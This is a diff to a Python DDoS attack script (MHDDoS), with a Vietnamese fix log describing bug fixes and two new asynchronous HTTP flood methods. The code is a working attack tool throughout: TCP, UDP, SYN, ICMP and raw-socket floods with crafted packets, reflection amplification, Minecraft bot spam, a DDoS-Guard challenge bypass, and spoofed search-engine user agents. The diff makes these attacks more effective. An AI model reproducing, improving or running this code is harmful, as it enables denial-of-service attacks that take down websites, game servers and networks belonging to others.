@@ -1,4 +1,44 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+MHDDoS - DDoS Attack Script (remake + đã vá lỗi)
+
+================= FIX LOG =================
+[B1] Layer4.TCP / Layer4.UDP: thêm `global REQUESTS_SENT, BYTES_SEND`.
+     Trước đây UnboundLocalError ở mỗi lần flush 4096 gói, bị
+     suppress(Exception) nuốt im -> PPS/BPS = 0 và socket bị đóng/mở lại liên tục.
+[B2] bombardier_path: khai báo ở cấp module -> BOMB không còn NameError.
+[B3] Menu tự tạo files/useragent.txt + files/referers.txt.
+[B4] Layer4._ovh_pool và _icmp_pkt: cache theo target.
+[B5] `STOP` / `TOOLS` thoát hẳn, không rơi xuống nhánh "Method Not Found".
+[B6] Thêm OVH-UDP vào danh sách method bắt buộc raw socket.
+[B7] ToolsConsole: implement CFIP và DNS.
+[B8] ToolsConsole.info(): đọc đúng key lồng nhau + nhiều endpoint.
+[B9] Layer4: reflector sai/thiếu -> báo lỗi rõ ràng.
+[B10] sys.setswitchinterval hạ thật xuống 0.001.
+[B11] Counter: cộng có lock -> không mất số khi nhiều thread.
+[B12] Ép kiểu argv có kiểm tra.
+[B13] threads và rpc bắt buộc >= 1.
+[B14] BOMB kiểm tra proxy trước khi spawn thread.
+[B15] Dọn code chết: _generate_ovhudp(), tor2webs trùng, class-attr cycle thừa.
+[B16] Tích hợp AIOHTTPFlood thành method L7 `AIOHTTP` (asyncio, keep-alive).
+[B17] FIX bug trong AsyncHttpFlood: `_open()` không nhận tham số `proxy`
+      nhưng `_flooder()` gọi `self._open(proxy)` -> TypeError bị
+      `except Exception` nuốt -> AIOHTTP không gửi được request nào.
+[B18] Tích hợp đoạn script asyncio rời thành method L7 `ASYNCIO`:
+      mỗi vòng lặp mở KẾT NỐI MỚI (tối đa hoá CPS), `threads` = số worker
+      coroutine, `rpc` = request mỗi kết nối. Thêm counter CONNECTIONS_SENT
+      và in PPS | CPS | BPS mỗi giây (info, không cần bật debug).
+      Logic flooder() giữ nguyên như script gốc, chỉ thêm close() để
+      không rò rỉ file descriptor và hỗ trợ proxy HTTP.
+[B19] AsyncHttpFlood._flooder / AsyncCpsFlood.flooder: thiếu
+      `global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT` ->
+      UnboundLocalError bị `except Exception` nuốt. ASYNCIO không gửi
+      được request nào; AIOHTTP chỉ gửi 1 request/kết nối và PPS/BPS = 0.
+==========================================
+"""
+
+import asyncio
 import sys
 from socket import SOL_SOCKET, SO_SNDBUF
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -7,14 +47,14 @@ from itertools import cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
-from multiprocessing import RawValue, Value
+from multiprocessing import Value
 from os import urandom as randbytes, getpid
 from pathlib import Path
 from re import compile
 from random import choice as randchoice, randint
-from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
-                    gethostname, socket)
+from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP,
+                    SOCK_DGRAM, IPPROTO_ICMP, SOCK_RAW, SOCK_STREAM, TCP_NODELAY,
+                    gethostbyname, gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 import ssl
 from struct import pack as data_pack
@@ -26,6 +66,7 @@ from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
+from base64 import b64encode
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
@@ -37,15 +78,13 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
-from base64 import b64encode
 
-sys.setswitchinterval(0.005)     # mặc định 0.005s -> tăng lên giảm context switch
+sys.setswitchinterval(0.001)          # [B10]
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
 logger = getLogger("MHDDoS")
 logger.setLevel("INFO")
 
-# Bật ANSI escape code trên Windows console cũ + UTF-8 cho output
 if sys.platform == "win32":
     with suppress(Exception):
         from ctypes import windll
@@ -57,10 +96,8 @@ if sys.platform == "win32":
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
-# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-# Disable insecure TLS versions for additional safety
 if hasattr(ssl, "OP_NO_TLSv1"):
     ctx.options |= ssl.OP_NO_TLSv1
 if hasattr(ssl, "OP_NO_TLSv1_1"):
@@ -69,43 +106,19 @@ if hasattr(ssl, "OP_NO_TLSv1_1"):
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
 __ip__: Any = None
+
+bombardier_path: Path = Path.home() / "go" / "bin" / "bombardier"
+
 tor2webs = [
-            'onion.city',
-            'onion.cab',
-            'onion.direct',
-            'onion.sh',
-            'onion.link',
-            'onion.ws',
-            'onion.pet',
-            'onion.rip',
-            'onion.plus',
-            'onion.top',
-            'onion.si',
-            'onion.ly',
-            'onion.my',
-            'onion.sh',
-            'onion.lu',
-            'onion.casa',
-            'onion.com.de',
-            'onion.foundation',
-            'onion.rodeo',
-            'onion.lat',
-            'tor2web.org',
-            'tor2web.fi',
-            'tor2web.blutmagie.de',
-            'tor2web.to',
-            'tor2web.io',
-            'tor2web.in',
-            'tor2web.it',
-            'tor2web.xyz',
-            'tor2web.su',
-            'darknet.to',
-            's1.tor-gateways.de',
-            's2.tor-gateways.de',
-            's3.tor-gateways.de',
-            's4.tor-gateways.de',
-            's5.tor-gateways.de'
-        ]
+    'onion.city', 'onion.cab', 'onion.direct', 'onion.sh', 'onion.link',
+    'onion.ws', 'onion.pet', 'onion.rip', 'onion.plus', 'onion.top',
+    'onion.si', 'onion.ly', 'onion.my', 'onion.lu', 'onion.casa',
+    'onion.com.de', 'onion.foundation', 'onion.rodeo', 'onion.lat',
+    'tor2web.org', 'tor2web.fi', 'tor2web.blutmagie.de', 'tor2web.to',
+    'tor2web.io', 'tor2web.in', 'tor2web.it', 'tor2web.xyz', 'tor2web.su',
+    'darknet.to', 's1.tor-gateways.de', 's2.tor-gateways.de',
+    's3.tor-gateways.de', 's4.tor-gateways.de', 's5.tor-gateways.de'
+]
 
 _cfg_path = __dir__ / "config.json"
 if not _cfg_path.exists():
@@ -146,7 +159,8 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR",
+        "RHEX", "STOMP", "AIOHTTP", "ASYNCIO"      # [B18]
     }
 
     LAYER4_AMP: Set[str] = {
@@ -156,15 +170,17 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
-                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
-                                "TS3", "MCPE", "ICMP", "OVH-UDP",
+                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
+                                "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
+    # [B18] method L7 chạy bằng asyncio (1 thread chứa event loop)
+    ASYNC_METHODS: Set[str] = {"AIOHTTP", "ASYNCIO"}
+
 
 search_engine_agents = [
-    # ---------------- Google ----------------
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
     "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
@@ -177,51 +193,29 @@ search_engine_agents = [
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
     "Mediapartners-Google",
     "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
-
-    # ---------------- Bing / Microsoft ----------------
     "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
     "BingPreview/1.0b",
     "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
-
-    # ---------------- Yahoo ----------------
     "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
     "Yahoo! Slurp China",
-
-    # ---------------- Yandex ----------------
     "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
     "YandexMobileBot/3.0 (+http://yandex.com/bots)",
     "YandexImages/3.0 (+http://yandex.com/bots)",
     "YandexVideo/3.0 (+http://yandex.com/bots)",
     "YandexNews/3.0 (+http://yandex.com/bots)",
-
-    # ---------------- Baidu ----------------
     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
     "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
     "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
-
-    # ---------------- DuckDuckGo ----------------
     "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
     "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
-
-    # ---------------- Applebot ----------------
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
     "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
     "+http://www.apple.com/go/applebot)",
-
-    # ---------------- Facebook / Social ----------------
     "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
     "Facebot/1.0",
-
-    # ---------------- Twitter ----------------
     "Twitterbot/1.0",
-
-    # ---------------- LinkedIn ----------------
     "LinkedInBot/1.0 (+https://www.linkedin.com/)",
-
-    # ---------------- Pinterest ----------------
     "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
-
-    # ---------------- Other Major Bots ----------------
     "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
     "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
     "MJ12bot/v1.4.8 (http://mj12bot.com/)",
@@ -232,28 +226,67 @@ search_engine_agents = [
     "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
 ]
 
+DEFAULT_REFERERS: List[str] = [
+    "https://www.facebook.com/l.php?u=",
+    "https://www.facebook.com/sharer/sharer.php?u=",
+    "https://drive.google.com/viewerng/viewer?url=",
+    "https://www.google.com/translate?u="
+]
+
+DEFAULT_USERAGENTS: List[str] = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
+    'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
+    'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
+    'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+    'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+    'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
+    'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+    'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
+]
+
 
 class Counter:
-    """Đếm nhanh: RawValue không lock (sai số cực nhỏ), 64-bit."""
+    """[B11] Bộ đếm dùng chung giữa các thread, có lock -> không mất số."""
     __slots__ = ("_value",)
 
     def __init__(self, value: int = 0):
-        self._value = RawValue('q', value)
+        self._value = Value('q', value)
 
     def __iadd__(self, value: int):
-        self._value.value += value
+        with self._value.get_lock():
+            self._value.value += value
         return self
 
     def __int__(self) -> int:
         return self._value.value
 
     def set(self, value: int):
-        self._value.value = value
+        with self._value.get_lock():
+            self._value.value = value
         return self
 
 
 REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
+CONNECTIONS_SENT = Counter()      # [B18] CPS
 
 
 class Tools:
@@ -300,7 +333,7 @@ class Tools:
             return True
         if sent <= 0:
             return False
-        while sent < len(packet):          # gửi một phần -> gửi nốt phần còn lại
+        while sent < len(packet):
             n = sock.send(memoryview(packet)[sent:])
             if n <= 0:
                 return False
@@ -320,35 +353,24 @@ class Tools:
 
     @staticmethod
     def dgb_solver(url, ua, pro=None):
-        """Giải challenge DDoS-Guard, trả về Session đã có cookie (còn mở) hoặc None."""
         s = Session()
         if pro:
             s.proxies = pro
 
         hdrs = {
-            "User-Agent": ua,
-            "Accept": "text/html",
-            "Accept-Language": "en-US",
-            "Connection": "keep-alive",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "none",
-            "Sec-Fetch-User": "?1",
-            "TE": "trailers",
-            "DNT": "1",
+            "User-Agent": ua, "Accept": "text/html", "Accept-Language": "en-US",
+            "Connection": "keep-alive", "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none",
+            "Sec-Fetch-User": "?1", "TE": "trailers", "DNT": "1",
         }
         with s.get(url, headers=hdrs) as ss:
             for key, value in ss.cookies.items():
                 s.cookies.set_cookie(cookies.create_cookie(key, value))
 
         hdrs = {
-            "User-Agent": ua,
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate",
-            "Referer": url,
-            "Sec-Fetch-Dest": "script",
-            "Sec-Fetch-Mode": "no-cors",
+            "User-Agent": ua, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate", "Referer": url,
+            "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors",
             "Sec-Fetch-Site": "cross-site",
         }
         idss = None
@@ -360,14 +382,10 @@ class Tools:
 
         if idss:
             hdrs = {
-                "User-Agent": ua,
-                "Accept": "image/webp,*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Accept-Encoding": "gzip, deflate",
-                "Cache-Control": "no-cache",
-                "Referer": url,
-                "Sec-Fetch-Dest": "script",
-                "Sec-Fetch-Mode": "no-cors",
+                "User-Agent": ua, "Accept": "image/webp,*/*",
+                "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+                "Cache-Control": "no-cache", "Referer": url,
+                "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site",
             }
             with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
@@ -378,7 +396,8 @@ class Tools:
     @staticmethod
     def safe_close(sock=None):
         if sock:
-            sock.close()
+            with suppress(Exception):
+                sock.close()
 
 
 class Minecraft:
@@ -418,13 +437,8 @@ class Minecraft:
     def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
         return Minecraft.data(Minecraft.varint(0x00),
                               Minecraft.varint(version),
-                              Minecraft.data(
-                                  target[0].encode(),
-                                  b"\x00",
-                                  ip.encode(),
-                                  b"\x00",
-                                  uuid.hex.encode()
-                              ),
+                              Minecraft.data(target[0].encode(), b"\x00", ip.encode(),
+                                             b"\x00", uuid.hex.encode()),
                               Minecraft.short(target[1]),
                               Minecraft.varint(state))
 
@@ -473,17 +487,17 @@ class Layer4(Thread):
     _target: Tuple[str, int]
     _ref: Any
     SENT_FLOOD: Any
-    _amp_payloads = cycle
     _proxies: List[Proxy] = None
 
-    # --- pool dùng lại, tránh syscall trong hot loop ---
     BUF_SIZE = 512
     BUF_COUNT = 128
     _buf_pool: List[bytes] = None
     _syn_pool: List[bytes] = None
     _syn_target: Any = None
     _icmp_pkt: bytes = None
+    _icmp_target: Any = None          # [B4]
     _ovh_pool: List[bytes] = None
+    _ovh_target: Any = None           # [B4]
 
     def _bufs(self) -> List[bytes]:
         if Layer4._buf_pool is None:
@@ -516,7 +530,7 @@ class Layer4(Thread):
             "MCPE": self.MCPE,
             "FIVEM": self.FIVEM,
             "FIVEM-TOKEN": self.FIVEMTOKEN,
-            "OVH-UDP": self.OVHUDP, 
+            "OVH-UDP": self.OVHUDP,
             "MINECRAFT": self.MINECRAFT,
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
@@ -524,7 +538,7 @@ class Layer4(Thread):
         }
 
     def _syns(self) -> List[bytes]:
-        if Layer4._syn_target != self._target:
+        if Layer4._syn_pool is None or Layer4._syn_target != self._target:
             pkts = []
             for _ in range(512):
                 ip = IP()
@@ -554,6 +568,7 @@ class Layer4(Thread):
                         conn_type=AF_INET,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
+        global CONNECTIONS_SENT           # [B18]
         if self._proxies:
             s = randchoice(self._proxies).open_socket(
                 conn_type, sock_type, proto_type)
@@ -562,9 +577,11 @@ class Layer4(Thread):
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         s.settimeout(.9)
         s.connect(self._target)
+        CONNECTIONS_SENT += 1
         return s
 
     def TCP(self) -> None:
+        global REQUESTS_SENT, BYTES_SEND        # [B1]
         bufs = self._bufs()
         nb = len(bufs)
         i = n = 0
@@ -572,7 +589,7 @@ class Layer4(Thread):
         ev = self._synevent
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            s.settimeout(None)               # blocking -> bỏ poll() mỗi send
+            s.settimeout(None)
             send = s.send
             while ev.is_set():
                 send(bufs[i])
@@ -615,7 +632,7 @@ class Layer4(Thread):
 
     def CONNECTION(self) -> None:
         global REQUESTS_SENT
-        if active_count() > 4096:          # chặn nổ thread
+        if active_count() > 4096:
             sleep(.01)
             return
         with suppress(Exception):
@@ -623,6 +640,7 @@ class Layer4(Thread):
             REQUESTS_SENT += 1
 
     def UDP(self) -> None:
+        global REQUESTS_SENT, BYTES_SEND        # [B1]
         bufs = self._bufs()
         nb = len(bufs)
         i = 0
@@ -633,8 +651,8 @@ class Layer4(Thread):
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
             with suppress(OSError):
-                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)   # 4MB -> không drop
-            if sys.platform == "win32":                        # tránh WSAECONNRESET
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
+            if sys.platform == "win32":
                 with suppress(Exception):
                     s.ioctl(socket.SIO_UDP_CONNRESET, False)
             sendto = s.sendto
@@ -644,7 +662,7 @@ class Layer4(Thread):
                 if i >= nb:
                     i = 0
                 n += 1
-                if n >= 4096:                 # flush counter theo lô
+                if n >= 4096:
                     REQUESTS_SENT += n
                     BYTES_SEND += n * bs
                     n = 0
@@ -654,7 +672,7 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def _ovh_packets(self) -> List[bytes]:
-        if Layer4._ovh_pool is None:
+        if Layer4._ovh_pool is None or Layer4._ovh_target != self._target:
             pool = []
             for _ in range(64):
                 ip = IP()
@@ -671,6 +689,7 @@ class Layer4(Thread):
                 ip.contains(udp)
                 pool.append(ip.get_packet())
             Layer4._ovh_pool = pool
+            Layer4._ovh_target = self._target
         return Layer4._ovh_pool
 
     def OVHUDP(self) -> None:
@@ -682,6 +701,8 @@ class Layer4(Thread):
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            with suppress(OSError):
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
             sendto = s.sendto
             while ev.is_set():
                 sendto(pkts[i], target)
@@ -691,8 +712,9 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def ICMP(self) -> None:
-        if Layer4._icmp_pkt is None:
+        if Layer4._icmp_pkt is None or Layer4._icmp_target != self._target:
             Layer4._icmp_pkt = self._genrate_icmp()
+            Layer4._icmp_target = self._target
         payload = Layer4._icmp_pkt
         ev = self._synevent
         target = self._target
@@ -729,6 +751,8 @@ class Layer4(Thread):
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            with suppress(OSError):
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 << 20)
             while self._synevent.is_set():
                 packet, target = next(self._amp_payloads)
                 Tools.sendto(s, packet, target)
@@ -736,7 +760,6 @@ class Layer4(Thread):
 
     def MCBOT(self) -> None:
         s = None
-
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         self.protocolid,
@@ -746,7 +769,7 @@ class Layer4(Thread):
             username = f"{con.get('MCBOT', 'MHDDoS')}{ProxyTools.Random.rand_str(5)}"
             password = b64encode(username.encode()).decode()[:8].title()
             Tools.send(s, Minecraft.login(self.protocolid, username))
-            
+
             sleep(1.5)
 
             Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
@@ -760,7 +783,7 @@ class Layer4(Thread):
 
     def VSE(self) -> None:
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                    b'\x20\x51\x75\x65\x72\x79\x00')
+                   b'\x20\x51\x75\x65\x72\x79\x00')
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
             s.settimeout(.9)
@@ -769,13 +792,11 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def FIVEMTOKEN(self) -> None:
-        # Sinh token và guid
         token = str(uuid4())
         steamid_min = 76561197960265728
         steamid_max = 76561199999999999
         guid = str(randint(steamid_min, steamid_max))
 
-        # Payload RakNet: PHẢI có prefix \xff\xff\xff\xff
         payload = b"\xff\xff\xff\xff" + f"getinfo token={token}&guid={guid}".encode()
 
         s = None
@@ -805,50 +826,15 @@ class Layer4(Thread):
 
     def MCPE(self) -> None:
         payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
-                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
-                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
-                    b'\x73')
+                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
+                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
+                   b'\x73')
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
             s.settimeout(.9)
             while self._synevent.is_set() and Tools.sendto(s, payload, self._target):
                 continue
         Tools.safe_close(s)
-
-    def _generate_ovhudp(self) -> List[bytes]:
-        packets = []
-
-        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
-        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']
-
-        for _ in range(randint(2, 4)):
-            ip = IP()
-            ip.set_ip_src(__ip__)
-            ip.set_ip_dst(self._target[0])
-
-            udp = UDP()
-            udp.set_uh_sport(randint(1024, 65535))
-            udp.set_uh_dport(self._target[1])
-
-            payload_size = randint(1024, 2048)
-            random_part = randbytes(payload_size).decode("latin1", "ignore")
-
-            method = randchoice(methods)
-            path = randchoice(paths)
-
-            payload_str = (
-                f"{method} {path}{random_part} HTTP/1.1\n"
-                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
-            )
-
-            payload = payload_str.encode("latin1", "ignore")
-
-            udp.contains(Data(payload))
-            ip.contains(udp)
-
-            packets.append(ip.get_packet())
-
-        return packets
 
     def _genrate_syn(self) -> bytes:
         ip: IP = IP()
@@ -1000,58 +986,18 @@ class HttpFlood(Thread):
         }
 
         if not referers:
-            referers: List[str] = [
-                "https://www.facebook.com/l.php?u=",
-                "https://www.facebook.com/sharer/sharer.php?u=",
-                "https://drive.google.com/viewerng/viewer?url=",
-                "https://www.google.com/translate?u="
-            ]
+            referers: List[str] = list(DEFAULT_REFERERS)
         self._referers = list(referers)
         if proxies:
             self._proxies = list(proxies)
 
         if not useragents:
-            useragents: List[str] = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
-                'Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
